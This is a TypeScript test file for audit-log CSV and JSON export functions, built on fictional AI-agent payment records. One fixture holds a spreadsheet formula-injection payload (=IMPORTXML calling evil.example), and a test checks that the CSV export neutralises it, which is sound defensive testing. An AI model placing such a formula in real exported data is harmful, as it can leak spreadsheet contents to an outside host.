import assert from 'node:assert/strict';
import test from 'node:test';
import type { MemoryRecord } from '@/types/domain';
import type { AuditEvent } from './types';
import {
  buildAuditCsv,
  buildAuditExport,
  buildAuditExportFilename,
  buildAuditJson,
  planAuditExport,
} from './export-utils';
import {
  FINANCIAL_AUDIT_CSV_COLUMNS,
  buildFinancialAuditCsv,
  buildFinancialAuditExport,
  buildFinancialAuditExportFilename,
  buildFinancialAuditJson,
  planFinancialAuditExport,
} from './financial-export';

const auditEvents: AuditEvent[] = [
  {
    id: 'evt_1',
    timestamp: '2026-07-31T07:42:00.000Z',
    eventType: 'action',
    level: 'info',
    actorId: 'agt_atlas',
    actorName: 'Atlas',
    actorType: 'agent',
    summary: 'Purchased inference credits',
    details: 'Bought 18,500 USDC of OpenAI credits after a single approval.',
    project: 'Multilingual translation research',
    amount: 18_500,
    asset: 'USDC',
    xdrHash: 'a3f9c1e7',
    rawPayload: { ledger: 54_912_004, ops: ['payment'] },
  },
  {
    id: 'evt_2',
    timestamp: '2026-07-29T23:08:00.000Z',
    eventType: 'policy_change',
    level: 'error',
    actorId: 'sys_policy',
    actorName: 'Policy Engine',
    actorType: 'system',
    summary: '=IMPORTXML("https://evil.example","//td")',
    details: 'Amount exceeds ceiling; "unverified" recipient blocked.\nNo funds moved.',
    rawPayload: {},
  },
];

const memoryRecords: MemoryRecord[] = [
  {
    id: 'mem_001',
    agentId: 'agt_atlas',
    agentName: 'Atlas',
    transactionId: 'txn_9f21',
    reason: 'Inference credits were forecast to run out in 4 days at current burn.',
    task: 'Sustain research inference pipeline through Q3',
    project: 'Multilingual translation research',
    conversationId: 'conv_7742',
    amount: 18_500,
    asset: 'USDC',
    policyUsed: 'Maximum transaction ceiling',
    approvedBy: ['Marco Vitale'],
    riskScore: 24,
    stellarHash: 'a3f9c1e7b2d84f60',
    summary: 'Atlas purchased 18,500 USDC of credits after a single finance approval.',
    steps: [
      {
        kind: 'decision',
        title: 'Intent — purchase credits',
        detail: 'Cheapest option covering projected Q3 demand.',
        actor: 'Atlas',
        timestamp: '2026-07-31T07:24:00.000Z',
      },
    ],
    createdAt: '2026-07-31T07:42:00.000Z',
  },
  {
    id: 'mem_003',
    agentId: 'agt_orion',
    agentName: 'Orion',
    transactionId: 'txn_4d33',
    reason: 'Attempted onboarding payment to a new infrastructure vendor.',
    task: 'Onboard backup compute provider',
    project: 'Operations resilience',
    conversationId: 'conv_7688',
    amount: 41_000,
    asset: 'USDC',
    policyUsed: 'Maximum transaction ceiling',
    approvedBy: ['Marco Vitale', 'Ada Okonkwo'],
    riskScore: 91,
    summary: 'Blocked: unverified recipient, amount exceeds the ceiling.',
    steps: [
      {
        kind: 'policy',
        title: 'Policy check — blocked',
        detail: 'Execution blocked pending committee approval.',
        actor: 'Policy Engine',
        timestamp: '2026-07-29T23:08:00.000Z',
      },
    ],
    createdAt: '2026-07-29T23:14:00.000Z',
  },
];

test('audit CSV escapes special characters and neutralises formula injection', () => {
  const csv = buildAuditCsv(auditEvents);
  const [header, ...lines] = csv.split('\r\n');
  assert.equal(
    header,
    'Event ID,Timestamp,Level,Event Type,Actor ID,Actor Name,Actor Type,Project,Amount,Asset,Summary,Details,XDR Hash,Raw Payload',
  );
  assert.equal(lines.length, auditEvents.length + 1); // trailing CRLF leaves a final empty line
  assert.ok(
    csv.includes(
      '"Amount exceeds ceiling; ""unverified"" recipient blocked.\nNo funds moved."',
    ),
  );
  assert.ok(csv.includes('"\'=IMPORTXML(""https://evil.example"",""//td"")"'));
  assert.ok(csv.includes('"{""ledger"":54912004,""ops"":[""payment""]}"'));
});

test('audit JSON is a self-describing envelope with source metadata', () => {
  const json = buildAuditJson(auditEvents, new Date('2026-11-22T00:00:00.000Z'));
  const parsed = JSON.parse(json) as {
    exportedAt: string;
    source: string;
    count: number;
    events: AuditEvent[];
  };
  assert.equal(parsed.exportedAt, '2026-11-22T00:00:00.000Z');
  assert.equal(parsed.source, 'agent-activity-audit-log');
  assert.equal(parsed.count, auditEvents.length);
  assert.equal(parsed.events[0]?.id, 'evt_1');
  assert.deepEqual(parsed.events[1]?.rawPayload, {});
});

test('audit export filenames carry a descriptive timestamp', () => {
  const date = new Date('2026-11-22T09:05:07.008Z');
  assert.equal(
    buildAuditExportFilename('csv', date),
    'astroid-audit-log-2026-11-22T09-05-07-008Z.csv',
  );
  assert.equal(
    buildAuditExportFilename('json', date),
    'astroid-audit-log-2026-11-22T09-05-07-008Z.json',
  );
});

test('audit export payloads carry UTF-8 MIME types and parseable chunks', () => {
  const date = new Date('2026-11-22T00:00:00.000Z');
  const csv = buildAuditExport(auditEvents, 'csv', date);
  assert.equal(csv.mimeType, 'text/csv;charset=utf-8');
  assert.equal(csv.filename, 'astroid-audit-log-2026-11-22T00-00-00-000Z.csv');
  assert.equal(csv.chunks.length, auditEvents.length + 1);

  const json = buildAuditExport(auditEvents, 'json', date);
  assert.equal(json.mimeType, 'application/json;charset=utf-8');
  const parsed = JSON.parse(json.chunks.join('')) as { count: number };
  assert.equal(parsed.count, auditEvents.length);

  assert.deepEqual(
    Array.from(planAuditExport(auditEvents, 'csv', date).stream()),
    csv.chunks,
  );
});

test('empty audit logs still produce valid header/envelope output', () => {
  const date = new Date('2026-11-22T00:00:00.000Z');
  assert.equal(
    buildAuditCsv([]),
    'Event ID,Timestamp,Level,Event Type,Actor ID,Actor Name,Actor Type,Project,Amount,Asset,Summary,Details,XDR Hash,Raw Payload\r\n',
  );
  const parsed = JSON.parse(buildAuditJson([], date)) as {
    count: number;
    events: unknown[];
  };
  assert.equal(parsed.count, 0);
  assert.deepEqual(parsed.events, []);
});

test('financial audit CSV flattens records with approvers and steps serialized', () => {
  const csv = buildFinancialAuditCsv(memoryRecords);
  const header = csv.split('\r\n')[0];
  assert.equal(
    header,
    FINANCIAL_AUDIT_CSV_COLUMNS.map((column) => column.header).join(','),
  );
  assert.ok(header?.includes('Risk Score'));
  assert.ok(header?.includes('Decision Steps'));
  assert.ok(csv.includes('"Marco Vitale, Ada Okonkwo"'));
  assert.ok(csv.includes('"Intent — purchase credits"'));
  assert.ok(csv.includes('"18500"') || csv.includes(',18500,'));
});

test('financial audit JSON keeps full records, including the decision-step chain', () => {
  const json = buildFinancialAuditJson(
    memoryRecords,
    new Date('2026-11-22T00:00:00.000Z'),
  );
  const parsed = JSON.parse(json) as {
    exportedAt: string;
    source: string;
    count: number;
    records: MemoryRecord[];
  };
  assert.equal(parsed.exportedAt, '2026-11-22T00:00:00.000Z');
  assert.equal(parsed.source, 'financial-audit-log');
  assert.equal(parsed.count, memoryRecords.length);
  assert.equal(parsed.records[0]?.steps.length, 1);
  assert.deepEqual(parsed.records[1]?.approvedBy, ['Marco Vitale', 'Ada Okonkwo']);
});

test('financial audit export filenames carry a descriptive timestamp', () => {
  const date = new Date('2026-11-22T09:05:07.008Z');
  assert.equal(
    buildFinancialAuditExportFilename('csv', date),
    'astroid-financial-audit-log-2026-11-22T09-05-07-008Z.csv',
  );
  assert.equal(
    buildFinancialAuditExportFilename('json', date),
    'astroid-financial-audit-log-2026-11-22T09-05-07-008Z.json',
  );
});

test('financial audit export payloads carry UTF-8 MIME types and parseable chunks', () => {
  const date = new Date('2026-11-22T00:00:00.000Z');
  const csv = buildFinancialAuditExport(memoryRecords, 'csv', date);
  assert.equal(csv.mimeType, 'text/csv;charset=utf-8');
  assert.equal(csv.chunks.length, memoryRecords.length + 1);

  const json = buildFinancialAuditExport(memoryRecords, 'json', date);
  assert.equal(json.mimeType, 'application/json;charset=utf-8');
  const parsed = JSON.parse(json.chunks.join('')) as { count: number };
  assert.equal(parsed.count, memoryRecords.length);

  assert.deepEqual(
    Array.from(planFinancialAuditExport(memoryRecords, 'json', date).stream()),
    json.chunks,
  );
});

test('empty financial audit logs still produce valid header/envelope output', () => {
  const date = new Date('2026-11-22T00:00:00.000Z');
  assert.equal(
    buildFinancialAuditCsv([]),
    `${FINANCIAL_AUDIT_CSV_COLUMNS.map((column) => column.header).join(',')}\r\n`,
  );
  const parsed = JSON.parse(buildFinancialAuditJson([], date)) as {
    count: number;
    records: unknown[];
  };
  assert.equal(parsed.count, 0);
  assert.deepEqual(parsed.records, []);
});
